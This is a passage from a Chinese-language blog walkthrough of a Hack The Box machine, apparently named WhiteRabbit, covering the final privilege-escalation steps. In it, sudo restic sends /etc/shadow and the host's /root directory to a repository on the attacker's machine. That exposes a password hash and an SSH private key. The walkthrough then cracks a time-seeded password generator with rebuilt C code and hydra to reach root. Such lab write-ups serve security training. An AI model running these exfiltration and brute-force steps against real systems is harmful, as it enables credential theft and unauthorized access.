<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> restic backup -r rest:http://10.10.16.86:23456/test /etc/shadow</span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /root/.cache/restic</span><br><span class="line">no parent snapshot found, will <span class="built_in">read</span> all files</span><br><span class="line">[0:00]          0 index files loaded</span><br><span class="line"></span><br><span class="line">Files:           1 new,     0 changed,     0 unmodified</span><br><span class="line">Dirs:            1 new,     0 changed,     0 unmodified</span><br><span class="line">Added to the repository: 1.405 KiB (940 B stored)</span><br><span class="line"></span><br><span class="line">processed 1 files, 737 B <span class="keyword">in</span> 0:02</span><br><span class="line">snapshot 0ed726a0 saved</span><br></pre></td></tr></tbody></table></figure>

<p>到攻击机读取，发现成功读取</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test dump latest /etc/shadow</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /home/kali/.cache/restic</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">root:*:19936:0:99999:7:::</span><br><span class="line">daemon:*:19936:0:99999:7:::</span><br><span class="line">bin:*:19936:0:99999:7:::</span><br><span class="line">sys:*:19936:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19936:0:99999:7:::</span><br><span class="line">games:*:19936:0:99999:7:::</span><br><span class="line">man:*:19936:0:99999:7:::</span><br><span class="line">lp:*:19936:0:99999:7:::</span><br><span class="line">mail:*:19936:0:99999:7:::</span><br><span class="line">news:*:19936:0:99999:7:::</span><br><span class="line">uucp:*:19936:0:99999:7:::</span><br><span class="line">proxy:*:19936:0:99999:7:::</span><br><span class="line">www-data:*:19936:0:99999:7:::</span><br><span class="line">backup:*:19936:0:99999:7:::</span><br><span class="line">list:*:19936:0:99999:7:::</span><br><span class="line">irc:*:19936:0:99999:7:::</span><br><span class="line">_apt:*:19936:0:99999:7:::</span><br><span class="line">nobody:*:19936:0:99999:7:::</span><br><span class="line">ubuntu:!:19936:0:99999:7:::</span><br><span class="line">systemd-network:!*:19965::::::</span><br><span class="line">systemd-timesync:!*:19965::::::</span><br><span class="line">messagebus:!:19965::::::</span><br><span class="line">systemd-resolve:!*:19965::::::</span><br><span class="line">sshd:!:19965::::::</span><br><span class="line">bob:$y$j9T<span class="variable">$dC8deJ6oyvhG7RBktETA3</span>/<span class="variable">$VtU7l9Xdd6ADMrq64PBV2Ev68xpYQ9IDycSiHL7v9h7</span>:19965:0:99999:7:::</span><br></pre></td></tr></tbody></table></figure>

<p>然后备份<code>/root</code>目录并读取</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> restic backup -r rest:http://10.10.16.86:23456/test /root</span><br><span class="line">$ ./restic_0.16.4_linux_amd64 -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test <span class="built_in">ls</span> latest              </span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  2 / 2 index files loaded</span><br><span class="line">snapshot bbe202ec of [/root] filtered by [] at 2025-04-07 16:25:00.235977286 +0000 UTC):</span><br><span class="line">/root</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.cache</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh</span><br><span class="line">/root/morpheus</span><br><span class="line">/root/morpheus.pub</span><br></pre></td></tr></tbody></table></figure>

<p>这里的<code>/root</code>是宿主机的root目录，可以尝试ssh登录</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$chmod</span> 600 morpheus</span><br><span class="line">$ ssh -i morpheus morpheus@whiterabbit.htb</span><br><span class="line">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">'unminimize'</span> <span class="built_in">command</span>.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Apr 7 16:30:39 2025 from 10.10.16.86</span><br><span class="line">morpheus@whiterabbit:~$</span><br></pre></td></tr></tbody></table></figure>

<p>读取user.txt获取flag</p>
<h2 id="逆向密码生成器爆破出密码提权"><a href="#逆向密码生成器爆破出密码提权" class="headerlink" title="逆向密码生成器爆破出密码提权"></a>逆向密码生成器爆破出密码提权</h2><p>接下来要尝试获取root权限，考虑数据库查看到的密码生成器<code>/opt/neo-password-generator/neo-password-generator</code>，下载下来分析</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .</span><br></pre></td></tr></tbody></table></figure>

<p>放到IDA分析</p>
<img src="/posts/25594414/image-20250408011716119.png" class="" title="image-20250408011716119">

<p><code>generate_password</code>函数用当前时间戳作为函数，生成20位密码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">generate_password</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  srand(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s[i] = aAbcdefghijklmn[rand() % <span class="number">62</span>];</span><br><span class="line">  s[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>我们只需要还原程序，然后在<code>2024-08-30 14:40:42</code>的接下来1000毫秒生成密码字典去爆破，就能拿到<code>neo</code>的密码。</p>
<p>经过还原修改后如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> charset[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generate_password</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seed)</span> {</span><br><span class="line">    <span class="type">char</span> password[<span class="number">24</span>];</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i) {</span><br><span class="line">        password[i] = charset[rand() % <span class="number">62</span>];</span><br><span class="line">    }</span><br><span class="line">    password[<span class="number">20</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(password);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">long</span> timestamp = <span class="number">1725028842</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ms = <span class="number">0</span>; ms &lt; <span class="number">1000</span>; ms++) {</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> seed = (timestamp * <span class="number">1000</span>) + ms;</span><br><span class="line">        generate_password(seed);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>编译运行，用<code>hydra</code>进行爆破</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -static -o pass passwd.c</span><br><span class="line">$ ./pass &gt; password.txt</span><br><span class="line">$ hydra -l neo -P password.txt ssh://whiterabbit.htb          </span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 13:05:58</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task</span><br><span class="line">[DATA] attacking ssh://whiterabbit.htb:22/</span><br><span class="line">[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 2 final worker threads did not complete <span class="keyword">until</span> end.</span><br><span class="line">[ERROR] 2 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 13:06:08</span><br></pre></td></tr></tbody></table></figure>

<p>获取到密码为<code>WBSxhWgfnMiclrV4dqfj</code>，登录账户</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">morpheus@whiterabbit:~$ su neo</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">id</span></span><br><span class="line">uid=1000(neo) gid=1000(neo) <span class="built_in">groups</span>=1000(neo),27(<span class="built_in">sudo</span>)</span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> neo: </span><br><span class="line"><span class="built_in">sudo</span>: 1 incorrect password attempt</span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> neo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> neo on whiterabbit:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User neo may run the following commands on whiterabbit:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    </span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -i</span><br><span class="line"></span><br><span class="line">root@whiterabbit:~#</span><br></pre></td></tr></tbody></table></figure>

<p>读取<code>root.txt</code>即可获取flag</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	这个靶场感觉真的很难，首先巩固了信息收集技巧，不断地去拓扑，获取更多信息，增大攻击面。然后是这次的Web漏洞，并不是常规的直接进行sql注入，而是需要去分析服务端执行过程，有点像白盒。也是第一次使用flask代理sqlmap，上手实操了一次，也疏通了以前对于工具使用固化的地方，可以说是开拓了新思路。后面获取服务器的权限，容器内和逃逸都利用了<code>Restic</code>，也让我感觉到了其实漏洞并不是固化的东西，巧妙的思路最重要。然后就是最后的提权操作，纯逆向小白（），也是让我体验了一把逆向的乐趣。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HTB/" rel="tag"># HTB</a>
          </div>

        

    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">squar3c</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">90k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:43</span>
  </span>
</div>
  <div class="powered-by">
    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
  </div>

<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/03/2025 10:00:00"); //此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
    }
setInterval("createtime()",250);
</script>
    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  




<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '64px',
  right: '32px',
  left: '',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#100f2c',
  buttonColorLight: '#fff',
  saveInCookies: false,
  label: ' ',
  autoMatchOsTheme: false
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();
if (window.darkmode && !window.darkmode.isActivated()) {
  window.darkmode.toggle();
  var toggleButtons = document.getElementsByClassName("darkmode-toggle");
  if (toggleButtons && toggleButtons.length > 0) {
    for (i = 0; i < toggleButtons.length; i++) {
      toggleButtons[i].classList.add("darkmode-toggle--white");
    }
  }
}
</script>

</body>
</html>
